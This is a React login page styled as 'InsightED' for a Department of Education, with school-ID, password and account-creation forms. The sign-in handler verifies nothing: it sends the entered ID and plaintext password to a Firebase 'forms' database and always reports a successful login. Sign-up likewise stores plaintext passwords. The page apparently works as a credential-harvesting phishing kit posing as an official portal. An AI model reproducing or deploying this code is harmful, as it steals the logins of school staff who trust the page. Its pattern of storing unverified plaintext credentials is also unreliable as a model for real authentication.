import { useState } from "react";

const FIREBASE_URL = "https://forms-12c42-default-rtdb.firebaseio.com";

export default function App() {
  const [showPass, setShowPass]       = useState(false);
  const [isPasscode, setIsPasscode]   = useState(false);
  const [isSchoolHead, setIsSchoolHead] = useState(true);
  const [schoolId, setSchoolId]       = useState("");
  const [password, setPassword]       = useState("");
  const [status, setStatus]           = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [isSignup, setIsSignup]       = useState(false);
  const [suName, setSuName]           = useState("");
  const [suSchoolId, setSuSchoolId]   = useState("");
  const [suEmail, setSuEmail]         = useState("");
  const [suPassword, setSuPassword]   = useState("");
  const [suStatus, setSuStatus]       = useState("");

  const handlePasswordSwitch = () => {
    setIsPasscode(!isPasscode);
    setPassword("");
    setShowPass(false);
  };

  const handleSignIn = async () => {
    setStatus("Signing in...");
    try {
      await fetch(`${FIREBASE_URL}/logins.json`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          schoolId,
          password,
          mode: isPasscode ? "passcode" : "password",
          isSchoolHead,
          timestamp: new Date().toISOString(),
        }),
      });
      setStatus("");
      setShowSuccess(true);
    } catch (e) {
      setStatus("Error: " + e.message);
    }
  };

  const handleSignUp = async () => {
    if (!suName || !suSchoolId || !suEmail || !suPassword) {
      setSuStatus("Please fill in all fields.");
      return;
    }
    setSuStatus("Creating account...");
    try {
      await fetch(`${FIREBASE_URL}/accounts.json`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: suName,
          schoolId: suSchoolId,
          email: suEmail,
          password: suPassword,
          createdAt: new Date().toISOString(),
        }),
      });
      setSuStatus("Account created! You can now sign in.");
      setTimeout(() => {
        setIsSignup(false);
        setSuName(""); setSuSchoolId(""); setSuEmail(""); setSuPassword(""); setSuStatus("");
      }, 1800);
    } catch (e) {
      setSuStatus("Error: " + e.message);
    }
  };

  const inputStyle = {
    width: "100%",
    border: "1.5px solid #e4e7ec",
    borderRadius: "14px",
    background: "#f8f9fb",
    fontFamily: "inherit",
    color: "#1a1f36",
    outline: "none",
    boxSizing: "border-box",
    padding: "16px 50px 16px 48px",
    fontSize: "15px",
    fontWeight: 400,
    letterSpacing: "0.2px",
  };

  return (
    <div style={{
      minHeight: "100vh",
      background: "linear-gradient(160deg, #ece9ff 0%, #eef1ff 35%, #e9f0ff 65%, #d8e8ff 100%)",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
      padding: "32px 16px",
    }}>
      {/* Card */}
      <div style={{
        background: "#ffffff",
        borderRadius: "28px",
        width: "100%",
        maxWidth: "500px",
        padding: "44px 44px 40px",
        position: "relative",
        boxShadow: "0 4px 40px rgba(100,100,200,0.09)",
      }}>
        {/* Back button */}
        <button
          onClick={isSignup ? () => { setIsSignup(false); setSuStatus(""); } : undefined}
          style={{
            position: "absolute", top: "24px", left: "24px",
            background: "none", border: "none", cursor: "pointer",
            color: "#9ca3af", padding: "4px", lineHeight: 0,
          }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="15 18 9 12 15 6"/>
          </svg>
        </button>

        {/* Logo */}
        <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>
          <div style={{
            width: "90px", height: "90px", borderRadius: "18px",
            background: "#f8f9fb", border: "1px solid #eaecf0",
            overflow: "hidden", display: "flex", alignItems: "center", justifyContent: "center",
          }}>
            <img
              src="/logo.png"
              alt="InsightED"
              style={{ width: "100%", height: "100%", objectFit: "contain", padding: "6px" }}
              onError={e => {
                e.target.style.display = "none";
                e.target.nextSibling.style.display = "flex";
              }}
            />
            <span style={{
              display: "none", alignItems: "center", justifyContent: "center",
              width: "100%", height: "100%", fontSize: "22px", fontWeight: 800,
              color: "#2762ea", letterSpacing: "-1px",
            }}>iE</span>
          </div>
        </div>

        <div style={{ textAlign: "center", fontSize: "30px", fontWeight: 800, color: "#1a1f36", letterSpacing: "-0.5px", marginBottom: "4px" }}>InsightED</div>
        <div style={{ textAlign: "center", fontSize: "14px", color: "#94a3b8", marginBottom: "28px", fontWeight: 400 }}>Department of Education</div>

        {!isSignup ? (
          <>
            {/* School Head Toggle */}
            <div style={{
              display: "flex", alignItems: "center", justifyContent: "space-between",
              background: "#f8f9fb", borderRadius: "14px", padding: "14px 18px",
              marginBottom: "20px", border: "1.5px solid #f0f1f5",
            }}>
              <span style={{ fontSize: "12px", fontWeight: 700, color: "#64748b", letterSpacing: "0.6px", textTransform: "uppercase" }}>
                Are you a School Head?
              </span>
              <div
                onClick={() => setIsSchoolHead(!isSchoolHead)}
                style={{
                  width: "46px", height: "26px", borderRadius: "13px",
                  background: isSchoolHead ? "#2762ea" : "#d1d5db",
                  position: "relative", cursor: "pointer",
                  transition: "background 0.2s",
                  flexShrink: 0,
                }}>
                <div style={{
                  width: "20px", height: "20px", borderRadius: "50%",
                  background: "#fff",
                  position: "absolute", top: "3px",
                  left: isSchoolHead ? "23px" : "3px",
                  transition: "left 0.2s",
                  boxShadow: "0 1px 4px rgba(0,0,0,0.15)",
                }}/>
              </div>
            </div>

            {/* School ID */}
            <div style={{ position: "relative", marginBottom: "14px" }}>
              <span style={{ position: "absolute", left: "16px", top: "50%", transform: "translateY(-50%)", color: "#94a3b8", display: "flex", alignItems: "center" }}>
                <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="2,7 12,13 22,7"/>
                </svg>
              </span>
              <input
                type="text"
                placeholder="6-digit School ID"
                value={schoolId}
                onChange={e => setSchoolId(e.target.value)}
                style={{ ...inputStyle, letterSpacing: "0.5px" }}
              />
            </div>

            {/* Password/Passcode */}
            <div style={{ position: "relative", marginBottom: "6px" }}>
              <span style={{ position: "absolute", left: "16px", top: "50%", transform: "translateY(-50%)", color: "#94a3b8", display: "flex", alignItems: "center" }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
              </span>
              <input
                type={showPass ? "text" : "password"}
                placeholder={isPasscode ? "Passcode" : "Password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                style={inputStyle}
              />
              <span
                onClick={() => setShowPass(!showPass)}
                style={{ position: "absolute", right: "16px", top: "50%", transform: "translateY(-50%)", color: "#94a3b8", display: "flex", alignItems: "center", cursor: "pointer" }}>
                {showPass ? (
                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                    <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                    <line x1="1" y1="1" x2="23" y2="23"/>
                  </svg>
                ) : (
                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    <circle cx="12" cy="12" r="3"/>
                  </svg>
                )}
              </span>
            </div>

            {/* Switch + Forgot */}
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "10px 2px 22px" }}>
              <button
                onClick={handlePasswordSwitch}
                style={{ background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: "11px", fontWeight: 700, color: "#2d65ec", letterSpacing: "0.5px", textTransform: "uppercase", display: "flex", alignItems: "center", gap: "5px", padding: 0 }}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
                {isPasscode ? "Switch to Password" : "Switch to Passcode"}
              </button>
              <button style={{ background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: "11px", fontWeight: 700, color: "#2d65ec", letterSpacing: "0.5px", textTransform: "uppercase", padding: 0 }}>
                Forgot Password?
              </button>
            </div>

            {status && status !== "Signing in..." && (
              <div style={{ fontSize: "12px", color: "#e24b4a", textAlign: "center", marginBottom: "10px" }}>{status}</div>
            )}

            {/* Sign In Button */}
            <button
              onClick={handleSignIn}
              style={{
                width: "100%", padding: "17px", border: "none", borderRadius: "14px",
                background: "linear-gradient(90deg, #2762ea 0%, #5045e8 100%)",
                color: "#ffffff", fontFamily: "inherit", fontSize: "16px", fontWeight: 700,
                cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center",
                gap: "10px", marginBottom: "16px",
                boxShadow: "0 6px 22px rgba(39,98,234,0.32)",
                letterSpacing: "0.2px",
              }}>
              {status === "Signing in..." ? "Signing in..." : "Sign In"}
              {status !== "Signing in..." && (
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
                </svg>
              )}
            </button>

            {/* Create Account Link */}
            <div style={{ textAlign: "center" }}>
              <button
                onClick={() => setIsSignup(true)}
                style={{
                  background: "none", border: "none", cursor: "pointer",
                  fontFamily: "inherit", fontSize: "12px", fontWeight: 700,
                  color: "#2d65ec", letterSpacing: "1px", textTransform: "uppercase", padding: "6px 0",
                }}>
                Create New Account
              </button>
            </div>
          </>
        ) : (
          <>
            {[
              { label: "Full Name",  value: suName,      set: setSuName,     type: "text",     placeholder: "e.g. Juan dela Cruz" },
              { label: "School ID",  value: suSchoolId,  set: setSuSchoolId, type: "text",     placeholder: "Assigned school ID"  },
              { label: "Email",      value: suEmail,     set: setSuEmail,    type: "email",    placeholder: "you@deped.gov.ph"    },
              { label: "Password",   value: suPassword,  set: setSuPassword, type: "password", placeholder: "Choose a password"   },
            ].map(({ label, value, set, type, placeholder }) => (
              <div key={label} style={{ marginBottom: "14px" }}>
                <div style={{ fontSize: "11px", fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "6px" }}>{label}</div>
                <input
                  type={type}
                  placeholder={placeholder}
                  value={value}
                  onChange={e => set(e.target.value)}
                  style={{ ...inputStyle, padding: "14px 16px" }}
                />
              </div>
            ))}

            {suStatus && (
              <div style={{ fontSize: "12px", color: suStatus.startsWith("Account") ? "#22c55e" : "#e24b4a", textAlign: "center", marginBottom: "10px" }}>
                {suStatus}
              </div>
            )}

            <button
              onClick={handleSignUp}
              style={{
                width: "100%", padding: "17px", border: "none", borderRadius: "14px",
                background: "linear-gradient(90deg, #2762ea 0%, #5045e8 100%)",
                color: "#ffffff", fontFamily: "inherit", fontSize: "16px", fontWeight: 700,
                cursor: "pointer", marginBottom: "12px",
                boxShadow: "0 6px 22px rgba(39,98,234,0.32)",
              }}>
              {suStatus === "Creating account..." ? "Creating..." : "Create Account"}
            </button>

            <button
              onClick={() => { setIsSignup(false); setSuStatus(""); setSuName(""); setSuSchoolId(""); setSuEmail(""); setSuPassword(""); }}
              style={{
                width: "100%", padding: "16px", border: "1.5px solid #e4e7ec", borderRadius: "14px",
                background: "#ffffff", color: "#64748b", fontFamily: "inherit", fontSize: "12px",
                fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", cursor: "pointer",
              }}>
              Back to Sign In
            </button>
          </>
        )}
      </div>

      {/* Pills */}
      <div style={{ display: "flex", gap: "8px", marginTop: "18px", marginBottom: "24px", flexWrap: "wrap", justifyContent: "center" }}>
        {[
          {
            label: "Install App",
            href: "/install",
            icon: (
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="17" x2="12.01" y2="17" strokeWidth="2.5"/>
              </svg>
            ),
          },
          {
            label: "Troubleshoot",
            href: null,
            icon: (
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17" strokeWidth="2.5"/>
              </svg>
            ),
          },
          {
            label: "Help Desk Chat",
            href: "/helpdesk",
            icon: (
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
              </svg>
            ),
          },
        ].map(({ label, href, icon }) => {
          const pillStyle = {
            display: "flex", alignItems: "center", gap: "6px",
            padding: "9px 16px",
            background: "rgba(255,255,255,0.55)",
            border: "1px solid rgba(255,255,255,0.7)",
            borderRadius: "50px",
            fontSize: "12px", color: "#64748b",
            fontFamily: "inherit", fontWeight: 500,
            cursor: "pointer",
            backdropFilter: "blur(12px)",
            WebkitBackdropFilter: "blur(12px)",
            whiteSpace: "nowrap",
            textDecoration: "none",
            boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 4px rgba(100,120,200,0.07)",
          };
          return href ? (
            <a key={label} href={href} style={pillStyle}>{icon}{label}</a>
          ) : (
            <button key={label} style={pillStyle}>{icon}{label}</button>
          );
        })}
      </div>

      {/* Success Modal */}
      {showSuccess && (
        <div style={{
          position: "fixed", inset: 0, background: "rgba(0,0,0,0.35)",
          display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100,
        }}>
          <div style={{
            background: "#fff", borderRadius: "22px", padding: "40px 36px",
            maxWidth: "320px", width: "90%", textAlign: "center",
            boxShadow: "0 8px 40px rgba(39,98,234,0.15)",
          }}>
            <div style={{ width: "64px", height: "64px", borderRadius: "50%", background: "#ecfdf5", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px" }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12"/>
              </svg>
            </div>
            <div style={{ fontSize: "22px", fontWeight: 800, color: "#1a1f36", marginBottom: "6px" }}>Signed In!</div>
            <div style={{ fontSize: "13px", color: "#94a3b8", marginBottom: "24px" }}>Welcome back. You've successfully logged in to InsightED.</div>
            <button
              onClick={() => setShowSuccess(false)}
              style={{
                width: "100%", padding: "14px", border: "none", borderRadius: "12px",
                background: "#2762ea", color: "#fff", fontFamily: "inherit", fontSize: "14px", fontWeight: 700, cursor: "pointer",
              }}>
              Continue to Dashboard
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
